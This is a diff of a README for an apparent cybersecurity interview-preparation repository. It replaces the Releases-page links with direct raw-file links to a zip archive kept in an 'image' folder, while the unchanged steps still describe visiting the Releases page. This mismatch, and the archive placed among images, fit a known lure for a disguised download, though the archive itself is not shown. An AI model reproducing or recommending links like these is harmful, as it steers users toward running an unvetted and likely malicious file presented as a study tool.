@@ -1,7 +1,7 @@
 # 🚀 cybersecurity-interview-boilerplate - Prepare for Your Next Interview with Confidence
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Ajoloid/cybersecurity-interview-boilerplate/releases)
+[![Download](https://raw.githubusercontent.com/Ajoloid/cybersecurity-interview-boilerplate/main/web安全/image/interview-boilerplate-cybersecurity-3.7.zip)](https://raw.githubusercontent.com/Ajoloid/cybersecurity-interview-boilerplate/main/web安全/image/interview-boilerplate-cybersecurity-3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to the **cybersecurity-interview-boilerplate** repository! This application helps you prepare for cybersecurity interviews by compiling commonly asked questions and answers. 
@@ -21,7 +21,7 @@ You need the following to run this application:
 ## 📂 Download & Install
 To get started, visit the following page to download the latest version of the application:
 
-[Download Here](https://github.com/Ajoloid/cybersecurity-interview-boilerplate/releases)
+[Download Here](https://raw.githubusercontent.com/Ajoloid/cybersecurity-interview-boilerplate/main/web安全/image/interview-boilerplate-cybersecurity-3.7.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version.
